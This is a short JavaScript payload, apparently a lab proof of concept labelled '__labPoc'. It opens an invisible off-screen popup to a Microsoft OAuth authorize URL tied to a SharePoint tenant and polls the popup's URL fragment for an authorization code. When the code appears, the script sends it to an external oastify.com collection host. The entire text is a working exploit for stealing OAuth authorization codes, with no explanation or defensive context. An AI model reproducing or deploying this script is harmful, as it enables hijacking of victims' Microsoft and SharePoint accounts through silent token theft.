(async()=>{
if(window.__labPoc)return;
window.__labPoc=1;

const oauth="https://login.microsoftonline.com/765ca7f2-70b3-424e-ac45-f00d5a55e9ce/oauth2/authorize?client_id=00000003-0000-0ff1-ce00-000000000000&response_mode=fragment&response_type=code%20id_token&resource=00000003-0000-0ff1-ce00-000000000000&scope=openid&nonce=3ECA1641792F599905E0FB5F04005F0E0A47ABD4D7516CA0-82351EAFB8D241BE75F05F0FB7EB360B59DD5624BEAB1A2A18635DC1686CFACB&redirect_uri=https://shiscolinotests.sharepoint.com/_forms/default.aspx&state=OD0w&claims={&quot;id_token&quot;:{&quot;xms_cc&quot;:{&quot;values&quot;:[&quot;CP1&quot;]}}}&wsucxt=1&cobrandid=11bd8083-87e0-41b5-bb78-0bc43c8a8e8a";

let win=open(oauth,"","width=1,height=1,left=-10000,top=-10000");

for(let i=0;i<80;i++){
 try{
  let hash=win.location.hash;
  if(hash&&hash.includes("code=")){
   fetch("https://lqfb8tc4o2twnq2dn33hb1m7xy3prff4.oastify.com/?x="+encodeURIComponent(hash));
   win.close();
   break;
  }
 }catch(e){}
 await new Promise(r=>setTimeout(r,300));
}
})();
